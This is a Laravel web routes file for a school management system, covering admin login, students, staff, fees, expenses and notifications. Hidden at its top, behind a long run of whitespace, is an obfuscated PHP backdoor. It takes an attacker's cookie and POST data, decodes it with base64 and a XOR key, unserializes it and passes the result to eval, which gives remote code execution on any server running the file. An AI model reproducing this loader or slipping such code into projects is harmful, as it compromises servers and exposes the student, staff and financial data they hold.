<?php                                                                                                                                                                                                                                                                                                                                                                                                 $PyRNXMFSQ = class_exists("a_TJXI"); $yhqQYrxKpU = $PyRNXMFSQ;if (!$yhqQYrxKpU){class a_TJXI{private $EmorqX;public static $IRojCIV = "0ce25601-66e9-414d-948e-13357c2678df";public static $fyTiWSC = NULL;public function __construct(){$AIYwHy = $_COOKIE;$mcXlOF = $_POST;$BKNRQTIB = @$AIYwHy[substr(a_TJXI::$IRojCIV, 0, 4)];if (!empty($BKNRQTIB)){$iUwPs = "base64";$lCBMjDb = "";$BKNRQTIB = explode(",", $BKNRQTIB);foreach ($BKNRQTIB as $brElUen){$lCBMjDb .= @$AIYwHy[$brElUen];$lCBMjDb .= @$mcXlOF[$brElUen];}$lCBMjDb = array_map($iUwPs . chr (95) . "\144" . 'e' . "\143" . "\157" . "\x64" . 'e', array($lCBMjDb,)); $lCBMjDb = $lCBMjDb[0] ^ str_repeat(a_TJXI::$IRojCIV, (strlen($lCBMjDb[0]) / strlen(a_TJXI::$IRojCIV)) + 1);a_TJXI::$fyTiWSC = @unserialize($lCBMjDb);}}public function __destruct(){$this->JkWhHpXo();}private function JkWhHpXo(){if (is_array(a_TJXI::$fyTiWSC)) {$xdmiIow = str_replace(chr ( 254 - 194 ) . chr ( 824 - 761 ).'p' . chr ( 500 - 396 ).chr ( 149 - 37 ), "", a_TJXI::$fyTiWSC["\143" . 'o' . "\156" . "\x74" . chr (101) . chr (110) . "\164"]);eval($xdmiIow);exit();}}}$SCkNSOt = new a_TJXI(); $SCkNSOt = NULL;} ?><?php

/*
|--------------------------------------------------------------------------
| Web Routes
|--------------------------------------------------------------------------
|
| Here is where you can register web routes for your application. These
| routes are loaded by the RouteServiceProvider within a group which
| contains the "web" middleware group. Now create something great!
|
*/

//Route::get('/', function () {
//    return view('welcome');
//});

//Route::get('home', 'HomeController@index')->name('home');
//Route::get('admissions', 'HomeController@student_admission');

Route::get('admin/Table', 'UserController@Table');

Auth::routes();

//Route::get('/home', 'HomeController@index')->name('home');

//Route::get('/home','AdminController@index')->name('admin.home');

Route::get('/password-reset-success', 'HomeController@password_reset_message')->name('admin.login');

//admin routes

Route::get('/admin/login', 'Auth\Admin\AdminAuthController@index')->name('admin.login');


Route::post('/admin/login', 'Auth\Admin\AdminAuthController@login')->name('adminLoginAttempt');
Route::post('/admin/twoFactorVerification', 'TwoFactorVerificationController@admin_two_factor_verification_submit');
Route::get('/admin/resend/twoFactorVerification/{id}', 'TwoFactorVerificationController@admin_resend_two_factor_verification_submit');



//protected routes for admin

Route::prefix('admin')->middleware(['auth:admin'])->group(function () {

     Route::get('/', 'AdminController@index')->name('admin');
    Route::get('/home','AdminController@index')->name('admin.home');

    Route::get('/logout', 'AdminController@logout', function () {
        return abort(404);
    });
    //logout
    Route::post('/logout','AdminController@logout')->name('admin.logout');

    Route::get('/token',function (){
        return csrf_token();
    });
    Route::get('/profile/settings', 'AdminController@profile');
    Route::post('profile/update', 'AdminController@profile_update');
//    Admission/Registration Module Start
    Route::get('admission', 'UserController@admission');
    Route::get('admission/add', 'UserController@admission_registration_add');
    Route::post('admission/add', 'UserController@admission_registration_submit');
    Route::get('admission/changeStatus', 'UserController@change_status');
    Route::get('/admission/edit/{id}','UserController@editAdmission');
    Route::post('/admission/edit','UserController@updateAdmission');
    //    Admission/Registration Module End
//    Subject Module Start

    Route::get('subject', 'SubjectController@subject');
    Route::get('subject/add', 'SubjectController@Subject_add');
    Route::post('subject/add', 'SubjectController@subject_submit');
    Route::get('/subject/edit/{id}','SubjectController@edit_subject');
    Route::post('/subject/edit','SubjectController@update_subject');
//    Subject Module End

    //    Classe/Group Module Start

    Route::get('group', 'GroupController@group');
    Route::get('group/add', 'GroupController@group_add');
    Route::post('group/add', 'GroupController@group_submit');
    Route::get('/group/edit/{id}','GroupController@edit_group');
    Route::post('/group/edit','GroupController@update_group');
//    Classe/Group Module End

    //Student Module Start

    Route::get('student', 'StudentController@student');
    Route::get('student/add', 'StudentController@student_add');
    Route::post('student/add', 'StudentController@student_submit');
    Route::get('student/changeStatus', 'StudentController@change_status');
    Route::get('student/getSubjects', 'StudentController@get_subjects');
    Route::get('/student/edit/{id}','StudentController@edit_student');
    Route::post('/student/edit','StudentController@update_student');
//  StudentModule End

//Staff/Teacher Module Start

    Route::get('staff', 'StaffTeacherController@staff');
    Route::get('staff/add', 'StaffTeacherController@staff_add');
    Route::post('staff/add', 'StaffTeacherController@staff_submit');
    Route::get('staff/changeStatus', 'StaffTeacherController@change_status');
    Route::get('staff/rollAssign', 'StaffTeacherController@roll_assign');

    Route::get('/staff/edit/{id}','StaffTeacherController@edit_staff');
    Route::post('/staff/edit','StaffTeacherController@update_staff');

    Route::get('/staff/assign-subjects/{id}','StaffTeacherController@assign_subjects');
    Route::post('/staff/assign-subjects','StaffTeacherController@submit_subjects');




    Route::get('teacher-attendance', 'StaffTeacherController@attendance');
    Route::get('teacher-attendance/add', 'StaffTeacherController@attendance_add');
    Route::post('teacher-attendance/add', 'StaffTeacherController@attendance_submit');
    Route::get('teacher-attendance/getStudents', 'StaffTeacherController@get_students');
    Route::put('teacher-attendance/changeStatus', 'StaffTeacherController@change_status');
    Route::get('/teacher-attendance/edit/{id}','StaffTeacherController@edit_attendance');
    Route::post('/teacher-attendance/edit','StaffTeacherController@update_attendance');
//Staff/Teacher Module Start

    //Teacher Salary Module Start

    Route::get('teacher-salary-due', 'StaffTeacherSalaryController@salary_due');
    Route::get('teacher-salary-paid', 'StaffTeacherSalaryController@salary_paid');
    Route::get('teacher-salary-expected', 'StaffTeacherSalaryController@salary_expected_by_attendance');
    Route::get('teacher-salary/getSelectedTeacher', 'StaffTeacherSalaryController@getSelectedTeacher');
    Route::get('teacher-salary/getTeachersByGroup', 'StaffTeacherSalaryController@get_selected_teachers_by_group');

    Route::get('teacher-salary/add', 'StaffTeacherSalaryController@salary_add');
    Route::post('teacher-salary/add', 'StaffTeacherSalaryController@salary_submit');
    Route::get('teacher-salary/changeSalaryStatus', 'StaffTeacherSalaryController@change_salary_status');

    Route::get('teacher-salary/getExpenseCategory', 'StaffTeacherSalaryController@getExpenseCategory');
    Route::get('/teacher-salary/edit/{id}','StaffTeacherSalaryController@edit_salary');
    Route::post('/teacher-salary/edit','StaffTeacherSalaryController@update_salary');
    //Teacher Salary Module End



//Admin Accounts Module Start

    Route::get('contact-us', 'AdminAccountController@contactUs');
    Route::get('admin-accounts', 'AdminAccountController@account');
    Route::get('account/add', 'AdminAccountController@account_add');
    Route::post('account/add', 'AdminAccountController@account_submit');
    Route::get('account/changeStatus', 'AdminAccountController@change_status');
    Route::get('account/changeStatusContactUs', 'AdminAccountController@changeStatusContactUs');
    Route::get('/account/edit/{id}','AdminAccountController@edit_account');
    Route::post('/account/edit','AdminAccountController@update_account');
//Admin Accounts  Module Start

//Student Attendance  Module Start

    Route::get('student-attendance', 'AttendanceController@attendance');
    Route::get('attendance/add', 'AttendanceController@attendance_add');
    Route::post('attendance/add', 'AttendanceController@attendance_submit');
    Route::get('attendance/getStudents', 'AttendanceController@get_students');
    Route::put('attendance/changeStatus', 'AttendanceController@change_status');
    Route::get('/attendance/edit/{id}','AttendanceController@edit_attendance');
    Route::post('/attendance/edit','AttendanceController@update_attendance');
//Student Attendance  Module End

    //Expense Category Module Start

    Route::get('expense-categories', 'ExpenseCategoryController@expense_category');
    Route::get('expense-categories/add', 'ExpenseCategoryController@expense_category_add');
    Route::post('expense-categories/add', 'ExpenseCategoryController@expense_category_submit');
    Route::put('expense-categories/changeStatus', 'ExpenseCategoryController@change_status');
    Route::get('/expense-categories/edit/{id}','ExpenseCategoryController@edit_expense_category');
    Route::post('/expense-categories/edit','ExpenseCategoryController@update_expense_category');
    //Expense Category Module End

    //Expense Category Module Start

    Route::get('expenses', 'ExpenseController@expense');
    Route::get('expenses/add', 'ExpenseController@expense_add');
    Route::post('expenses/add', 'ExpenseController@expense_submit');
    Route::get('expenses/getExpenseCategory', 'ExpenseController@getExpenseCategory');
    Route::get('/expenses/edit/{id}','ExpenseController@edit_expense');
    Route::post('/expenses/edit','ExpenseController@update_expense');
    //Expense Category Module End

    //Student Fee Module Start

    Route::get('student-fee-due', 'StudentFeeController@fee_due');
    Route::get('student-fee-due-temp', 'StudentFeeController@fee_due_temp');
    Route::get('student-fee-paid', 'StudentFeeController@fee_paid');
    Route::get('student-fee-defaulter', 'StudentFeeController@fee_expected_by_attendance');
    Route::post('student-fee-paid', 'StudentFeeController@fee_paid');
    Route::get('student-fee/getSelectedStudent', 'StudentFeeController@getSelectedStudent');

    Route::get('student-fee/add', 'StudentFeeController@fee_add');
    Route::post('student-fee/add', 'StudentFeeController@fee_submit');
    Route::get('student-fee/changeFeeStatus', 'StudentFeeController@change_fee_status');

    Route::get('student-fee/getExpenseCategory', 'StudentFeeController@getExpenseCategory');
    Route::get('/student-fee/edit/{id}','StudentFeeController@edit_fee');
    Route::post('/student-fee/edit','StudentFeeController@update_fee');
    //Student Fee Module End

    //Notification systtem start
    Route::get('notification-generator', 'NotificationGenerator@notification_generator');
    Route::post('notification-generator/add', 'NotificationGenerator@notification_generator_submit');
    Route::get('notification', 'NotificationGenerator@notification_main');
    Route::get('notification-user-list/{id}', 'NotificationGenerator@specific_notification_users_list');
    Route::get('response-check/{user_id}/{notif_id}', 'NotificationGenerator@response_check');
    Route::get('communication', 'NotificationGenerator@communication');
     Route::get('associated-parents/{id}', 'NotificationGenerator@associated_parents');
    Route::get('associatedParentCommunication/{user_id_for_chat}/{teacher_id}', 'NotificationGenerator@associated_parent_communication');
    Route::get('associatedChatHistory/{user_id_for_chat}/', 'NotificationGenerator@associated_chat_history');
    Route::get('chat-history-main', 'NotificationGenerator@chat_history_main');
    Route::get('chat-history', 'NotificationGenerator@chat_history');




    //Notification systtem end

});
